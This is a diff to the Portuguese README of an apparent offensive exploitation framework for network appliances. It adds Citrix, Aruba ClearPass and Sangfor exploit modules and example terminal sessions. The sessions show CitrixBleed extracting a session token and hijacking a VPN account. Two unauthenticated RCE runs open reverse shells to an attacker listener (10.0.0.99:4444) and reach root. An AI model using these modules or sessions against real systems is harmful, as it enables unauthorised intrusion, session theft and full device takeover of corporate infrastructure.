@@ -287,16 +287,109 @@ exploits/appliances/f5/bigip_icontrol_rest_rce_cve_2022_1388
 exploits/appliances/f5/bigip_bigiq_icontrol_rce_cve_2021_22986
 ```
 
-### Citrix
+### Citrix / NetScaler
 
-| Produto | CVE | Tipo |
-|---------|-----|------|
-| NetScaler / ADC | CVE-2019-19781 | Path traversal (Shitrix) |
-| NetScaler | CVE-2023-3519 | RCE não autenticado |
+| Produto | CVE | CVSS | Tipo |
+|---------|-----|------|------|
+| NetScaler ADC/Gateway | CVE-2019-19781 | 9.8 | Path traversal (Shitrix) |
+| NetScaler ADC/Gateway | CVE-2023-3519 | 9.8 | RCE não autenticado |
+| NetScaler ADC/Gateway | CVE-2023-4966 | 9.4 | CitrixBleed — vazamento de token de sessão |
 
 ```
 exploits/appliances/citrix/netscaler_path_traversal_cve_2019_19781
 exploits/appliances/citrix/netscaler_rce_cve_2023_3519
+exploits/appliances/citrix/citrix_bleed_info_disclosure_cve_2023_4966
+```
+
+**Sessão terminal — CVE-2023-4966 (CitrixBleed):**
+
+```
+exf > use exploits/appliances/citrix/citrix_bleed_info_disclosure_cve_2023_4966
+exf (CitrixBleed CVE-2023-4966) > set target 10.0.80.1
+[+] target => 10.0.80.1
+exf (CitrixBleed CVE-2023-4966) > check
+[*] Verificando NetScaler em 10.0.80.1:443...
+[+] NetScaler ADC 14.1.8.40 detectado
+[+] Alvo vulnerável — versão < 14.1-8.50 (CitrixBleed)
+exf (CitrixBleed CVE-2023-4966) > run
+[*] Enviando requisição HTTP com Host header superdimensionado...
+[+] Resposta contém 264 bytes extras (memória fora dos limites)
+[+] Token de sessão AAA extraído: NSC_b6f2e...1a9c4
+[+] Sessão sequestrada como: corp\svc-vpnuser (acesso VPN confirmado)
+```
+
+---
+
+### Aruba ClearPass
+
+| Produto | CVE | CVSS | Tipo |
+|---------|-----|------|------|
+| ClearPass Policy Manager | CVE-2023-25594 | 9.8 | RCE não autenticado |
+| ClearPass Policy Manager | CVE-2022-37897 | 9.8 | SQL injection |
+
+```
+exploits/nac/aruba/aruba_clearpass_rce_cve_2023_25594
+exploits/nac/aruba/aruba_clearpass_sqli_cve_2022_37897
+```
+
+**Sessão terminal — CVE-2023-25594 (ClearPass RCE não autenticado):**
+
+```
+exf > use exploits/nac/aruba/aruba_clearpass_rce_cve_2023_25594
+exf (Aruba ClearPass RCE CVE-2023-25594) > set target 10.0.90.5
+[+] target => 10.0.90.5
+exf (Aruba ClearPass RCE CVE-2023-25594) > set lhost 10.0.0.99
+[+] lhost => 10.0.0.99
+exf (Aruba ClearPass RCE CVE-2023-25594) > check
+[*] Verificando Aruba ClearPass em 10.0.90.5:443...
+[+] ClearPass Policy Manager 6.11.4 detectado
+[+] Alvo vulnerável — versão < 6.11.5
+exf (Aruba ClearPass RCE CVE-2023-25594) > run
+[*] Explorando validação incorreta de entrada no handler de registro do portal guest...
+[+] Injeção de comando confirmada — uid=0(root)
+[*] Reverse shell para 10.0.0.99:4444 iniciado...
+[+] Shell recebido!
+exf (Aruba ClearPass RCE CVE-2023-25594) > shell
+# id
+uid=0(root) gid=0(root) groups=0(root)
+# hostname
+clearpass-primary.corp.internal
+```
+
+---
+
+### Sangfor
+
+| Produto | CVE | CVSS | Tipo |
+|---------|-----|------|------|
+| NGFW (Next Generation Firewall) | CVE-2019-13393 | 9.8 | RCE não autenticado |
+
+```
+exploits/firewalls/sangfor/sangfor_ngfw_unauth_rce_cve_2019_13393
+```
+
+**Sessão terminal — CVE-2019-13393 (Sangfor NGFW RCE não autenticado):**
+
+```
+exf > use exploits/firewalls/sangfor/sangfor_ngfw_unauth_rce_cve_2019_13393
+exf (Sangfor NGFW Unauth RCE CVE-2019-13393) > set target 10.0.70.1
+[+] target => 10.0.70.1
+exf (Sangfor NGFW Unauth RCE CVE-2019-13393) > set lhost 10.0.0.99
+[+] lhost => 10.0.0.99
+exf (Sangfor NGFW Unauth RCE CVE-2019-13393) > check
+[*] Verificando portal de gerenciamento Sangfor NGFW em 10.0.70.1:443...
+[+] Sangfor NGFW detectado (título da página: "Sangfor NGFW")
+[+] Alvo vulnerável — endpoint de RCE pré-auth exposto
+exf (Sangfor NGFW Unauth RCE CVE-2019-13393) > run
+[*] Enviando requisição não autenticada ao endpoint vulnerável da API de gerenciamento...
+[+] RCE confirmado (uid=0 na resposta)
+[*] Reverse shell para 10.0.0.99:4444 iniciado...
+[+] Shell recebido!
+exf (Sangfor NGFW Unauth RCE CVE-2019-13393) > shell
+# id
+uid=0(root) gid=0(root) groups=0(root)
+# cat /etc/sangfor/version
+NGFW Version: 8.0.5
 ```
 
 ---
@@ -331,14 +424,14 @@ O módulo `embedxpl-printer-vuln.nse` verifica 11 vendors de impressoras (HP, Ca
 |-----------|-----------------|---------------------|
 | Câmeras IP / NVR / DVR | 40+ | 580+ |
 | Roteadores / CPE / GPON | 85+ | 580+ |
-| Firewalls / VPN | 15+ | 80+ |
+| Firewalls / VPN / NAC | 34+ | 151+ |
 | Impressoras / MFP | 11+ | 185+ |
 | BMC / IPMI | 3 | 8 |
 | Switches L2/L3 | Cisco, D-Link, NETGEAR | 20+ |
 | ICS / OT / Industrial | PLCs, SCADA, HMIs | 35+ |
 | NAS | QNAP, Synology, D-Link | 15+ |
 | Hypervisors | Proxmox VE | 5+ |
-| Appliances (F5, Citrix) | 2 | 4 |
+| Appliances (F5, Citrix, Ivanti) | 3 | 6 |
 
 ---
 
